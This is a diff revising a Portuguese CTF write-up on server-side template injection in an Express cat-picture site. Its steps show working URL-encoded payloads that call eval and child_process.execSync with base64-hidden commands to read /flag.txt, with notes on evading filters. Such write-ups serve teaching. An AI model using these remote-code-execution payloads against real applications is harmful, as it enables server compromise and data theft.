@@ -8,23 +8,25 @@
 
 ## **1. Introdução**
 
-Neste write-up, abordaremos uma exploração que se aproveita da vulnerabilidade de Server-Side Template Injection (SSTI) em um servidor Express. O objetivo desta exploração é localizar a flag escondida no arquivo `/flag.txt` no servidor alvo. A exploração será realizada através de injeções de template, que permitem a execução de código arbitrário no servidor.
+Este documento descreve uma exploração bem-sucedida de uma vulnerabilidade Server-Side Template Injection (SSTI) em um servidor Express, com o objetivo de acessar a flag escondida no arquivo `/flag.txt`. A vulnerabilidade ocorre devido ao processamento inadequado de entradas de usuários, permitindo a execução de código arbitrário no servidor.
 
 ---
 
 ## **2. Análise do Código Vulnerável**
 
-O site exibe imagens de gatos e permite a inserção de um nome de gato através de uma URL, como no exemplo: `https://funny-cats.chapeudepalhahacker.club/gato?name=Alfredo`. A vulnerabilidade SSTI ocorre quando a entrada do usuário é processada sem a devida sanitização, permitindo a execução de código no servidor.
+O servidor em questão exibe imagens de gatos e permite que os usuários insiram um nome de gato por meio de uma URL, como no exemplo: `https://funny-cats.chapeudepalhahacker.club/gato?name=Alfredo`. O site não realiza a devida sanitização da entrada do usuário, o que possibilita a exploração através de injeções de template.
+
+A vulnerabilidade SSTI permite que código malicioso seja executado no lado do servidor, o que pode ser explorado para ler arquivos ou executar comandos arbitrários.
 
 ---
 
 ## **3. Exploração da SSTI**
 
-O objetivo da exploração é injetar código malicioso que nos permita ler o conteúdo do arquivo `/flag.txt`.
+A exploração foi realizada em três etapas principais: injeção de código básico, identificação do sistema operacional do servidor e, finalmente, leitura do conteúdo do arquivo `/flag.txt`.
 
 ### **Passo 1: Demonstração de Injeção de Template Básica**
 
-Injetamos um código simples que realiza uma multiplicação. O código está URL-encoded para garantir que os caracteres especiais sejam processados corretamente pelo servidor. Isso também ajuda a evitar que o código seja bloqueado ou modificado por filtros de segurança.
+Inicialmente, testamos a injeção com uma expressão simples para avaliar o comportamento do servidor.
 
 **Payload:**
 
@@ -34,7 +36,7 @@ Injetamos um código simples que realiza uma multiplicação. O código está UR
 
 **URL Encoded:**
 
-Utilizamos o [CyberChef](https://gchq.github.io/CyberChef) para o payload em URL. O resultado é:
+A codificação em URL do payload foi realizada para evitar problemas com caracteres especiais e filtros de segurança.
 
 ```plaintext
 %3C%25%3D%207*7%20%25%3E
@@ -42,19 +44,21 @@ Utilizamos o [CyberChef](https://gchq.github.io/CyberChef) para o payload em URL
 
 **URL Completa:**
 
-Injetamos o payload na URL completa através do source code:
+A URL completa com a injeção foi construída da seguinte forma:
 
 ```plaintext
 view-source:https://funny-cats.chapeudepalhahacker.club/gato?name=%3C%25%3D%207*7%20%25%3E
 ```
 
-**Saída:**
+**Resultado:**
+
+O servidor processou a injeção e retornou o resultado da multiplicação, confirmando a execução de código no lado servidor.
 
 ![Resultado da Injeção Básica](1.png)
 
 ### **Passo 2: Identificação do Sistema Operacional**
 
-Para identificar o sistema operacional do servidor, utilizamos a função `eval` para decodificar um buffer em base64 que executa o comando `os.platform()`. O código está URL-encoded para garantir que os caracteres especiais sejam processados corretamente pelo servidor.
+Para avançar na exploração, utilizamos a função `eval` junto com um buffer codificado em base64 para executar um comando que revela o sistema operacional do servidor. O comando utilizado foi `os.platform()`, que nos deu informações sobre a plataforma.
 
 **Payload:**
 
@@ -64,7 +68,7 @@ Para identificar o sistema operacional do servidor, utilizamos a função `eval`
 
 **URL Encoded:**
 
-Codificamos o payload em URL novamente, e o resultado é:
+A codificação do payload para URL ficou assim:
 
 ```plaintext
 %3C%25%3D%20'- Sistema Operacional: '%20%25%3E%3C%25%3Deval(Buffer('Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5yZXF1aXJlKCdvcycpLnBsYXRmb3JtKCk%3D',%20'base64').toString())%25%3E%3C%25%3D%20''%20%25%3E
@@ -72,19 +76,21 @@ Codificamos o payload em URL novamente, e o resultado é:
 
 **URL Completa:**
 
-Injetamos o payload na URL completa através do source code:
+A URL completa com o payload para a identificação do sistema operacional foi:
 
 ```plaintext
 view-source:https://funny-cats.chapeudepalhahacker.club/gato?name=%3C%25%3D%20'- Sistema Operacional: '%20%25%3E%3C%25%3Deval(Buffer('Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5yZXF1aXJlKCdvcycpLnBsYXRmb3JtKCk%3D',%20'base64').toString())%25%3E%3C%25%3D%20''%20%25%3E
 ```
 
-**Saída:**
+**Resultado:**
+
+O servidor retornou a plataforma do sistema operacional, confirmando a execução do comando.
 
 ![Identificação do Sistema Operacional](2.png)
 
 ### **Passo 3: Leitura do Conteúdo de /flag.txt**
 
-Para ler o conteúdo do arquivo `/flag.txt`, utilizamos a função `execSync` do módulo `child_process` para executar o comando `cat /flag.txt`. O código está URL-encoded para garantir que os caracteres especiais sejam processados corretamente pelo servidor.
+A etapa final consistiu em acessar o arquivo `/flag.txt` do servidor. Utilizamos o módulo `child_process` do Node.js para executar o comando `cat /flag.txt` e obter o conteúdo do arquivo. O comando foi codificado em base64 para evitar interferências de filtros de segurança.
 
 **Payload:**
 
@@ -94,7 +100,7 @@ Para ler o conteúdo do arquivo `/flag.txt`, utilizamos a função `execSync` do
 
 **URL Encoded:**
 
-Novamente encodamos para URL. O resultado é:
+O payload foi novamente URL-encoded para garantir o correto processamento no servidor:
 
 ```plaintext
 %3C%25%3D%20'- '%20%25%3E%3C%25%3D%20global.process.mainModule.require('child_process').execSync(Buffer('Y2F0IC9mbGFnLnR4dAo%3D',%20'base64').toString())%20%25%3E%3C%25%3D%20''%20%25%3E
@@ -102,13 +108,15 @@ Novamente encodamos para URL. O resultado é:
 
 **URL Completa:**
 
-Injetamos o payload na URL completa através do source code:
+A URL com a injeção para leitura do conteúdo do arquivo `/flag.txt` foi:
 
 ```plaintext
 view-source:https://funny-cats.chapeudepalhahacker.club/gato?name=%3C%25%3D%20'- '%20%25%3E%3C%25%3D%20global.process.mainModule.require('child_process').execSync(Buffer('Y2F0IC9mbGFnLnR4dAo%3D',%20'base64').toString())%20%25%3E%3C%25%3D%20''%20%25%3E
 ```
 
-**Saída:**
+**Resultado:**
+
+O servidor retornou o conteúdo do arquivo `/flag.txt`, revelando a flag.
 
 ![Leitura do Conteúdo de /flag.txt](3.png)
 
@@ -116,12 +124,12 @@ view-source:https://funny-cats.chapeudepalhahacker.club/gato?name=%3C%25%3D%20'-
 
 ## **4. Conclusão**
 
-Este desafio envolveu o processo de:
+A exploração da vulnerabilidade SSTI no servidor Express foi concluída com sucesso. Através da injeção de código malicioso, foi possível:
 
-1. Identificação da vulnerabilidade de SSTI no servidor Express.
-2. Injeção de código malicioso para identificar o sistema operacional do servidor.
-3. Execução de comandos no servidor para ler o conteúdo do arquivo `/flag.txt` e obter a flag.
+1. Verificar o processamento inadequado de entradas do usuário pelo servidor.
+2. Identificar o sistema operacional do servidor.
+3. Executar comandos arbitrários para acessar o conteúdo do arquivo `/flag.txt` e obter a flag.
 
-Com o conhecimento sobre a vulnerabilidade SSTI e a necessidade de URL encoding, foi possível realizar a exploração com sucesso e alcançar o objetivo final.
+Essa exploração destaca a importância de validar e sanitizar corretamente as entradas dos usuários para prevenir vulnerabilidades SSTI em aplicações web.
 
 ---
